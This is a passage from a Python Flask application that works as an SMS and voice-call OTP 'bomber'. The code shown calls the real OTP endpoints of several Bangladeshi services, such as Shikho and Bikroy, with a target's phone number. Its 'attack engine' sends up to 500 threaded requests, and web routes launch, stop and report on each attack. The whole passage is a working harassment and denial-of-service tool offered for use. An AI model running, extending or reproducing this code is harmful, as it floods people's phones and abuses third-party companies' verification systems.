    return _s().post('https://go-app.paperfly.com.bd/merchant/api/react/registration/voice_otp.php',
        headers=HDR(), json={'phone_number':n}, timeout=10)

def call_28(n):  # GhooriLearning voice v2
    return _s().post('https://api.ghoorilearning.com/api/auth/voice-otp?_app_platform=android',
        headers=HDR(), json={'mobile_no':n}, timeout=10)

def call_29(n):  # Shikho voice v2
    return _s().post('https://api.shikho.com/auth/v2/send/voice',
        headers=HDR(), json={'phone':n,'type':'student'}, timeout=10)

def call_30(n):  # Bikroy voice
    return _s().get(f'https://bikroy.com/data/phone_number_login/verifications/voice_otp?phone={n}',
        headers={"User-Agent":UA(),"Accept":"application/json"}, timeout=10)

# ── API REGISTRY ───────────────────────────────────────────────
SMS_APIS  = [globals()[f'sms_{str(i).zfill(2)}']  for i in range(1, 101)]
CALL_APIS = [globals()[f'call_{str(i).zfill(2)}'] for i in range(1, 31)]
ALL_APIS  = SMS_APIS + CALL_APIS

# ── ATTACK ENGINE ──────────────────────────────────────────────
def _pick_api(mode):
    if mode == 'call':
        return random.choice(CALL_APIS)
    return random.choice(SMS_APIS)

def _do_request(n, mode):
    if not state.active: return
    api = _pick_api(mode)
    name = api.__name__
    try:
        r = api(n)
        state.sent += 1
        if r is not None and r.status_code in (200, 201, 202):
            state.success += 1
            state.logs.insert(0, f"STRIKE: [{name}] → HTTP {r.status_code} ✓")
        else:
            code = r.status_code if r else '---'
            state.logs.insert(0, f"MISS: [{name}] → HTTP {code}")
    except requests.Timeout:
        state.logs.insert(0, f"FAIL: [{name}] → Timeout")
    except Exception as e:
        state.logs.insert(0, f"FAIL: [{name}] → {type(e).__name__}")
    if len(state.logs) > 40:
        state.logs.pop()

def attack_worker(number, count, delay_ms, mode):
    state.active=True; state.target=number; state.mode=mode
    state.total=count; state.sent=0; state.success=0
    state.logs=[f"SYSTEM: Launching {mode.upper()} attack → {number} × {count}"]
    with ThreadPoolExecutor(max_workers=8) as ex:
        for _ in range(count):
            if not state.active: break
            ex.submit(_do_request, number, mode)
            time.sleep(max(0.05, delay_ms/1000.0))
    state.logs.insert(0, f"SYSTEM: Done — {state.success}/{state.sent} successful")
    state.active = False

# ── FLASK ROUTES ───────────────────────────────────────────────
@app.route('/')
def home(): return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    d = request.get_json(force=True)
    if state.active:
        return jsonify({"status":"already_running"})
    threading.Thread(target=attack_worker,
        args=(str(d.get('num','')).strip(), min(int(d.get('count',50)),500),
              int(d.get('delay',150)), str(d.get('mode','sms')).lower()),
        daemon=True).start()
    return jsonify({"status":"launched"})

@app.route('/stop', methods=['POST'])
def stop():
    state.active=False
    return jsonify({"status":"terminated"})

@app.route('/status')
def status():
    return jsonify({"active":state.active,"sent":state.sent,"total":state.total,
                    "success":state.success,"logs":state.logs,"target":state.target,"mode":state.mode})

@app.route('/health')
def health():
    return jsonify({"status":"ok","version":"5.0","sms_apis":len(SMS_APIS),"call_apis":len(CALL_APIS)})

@app.route('/static/<path:filename>')
def static_files(filename):
    return app.send_static_file(filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
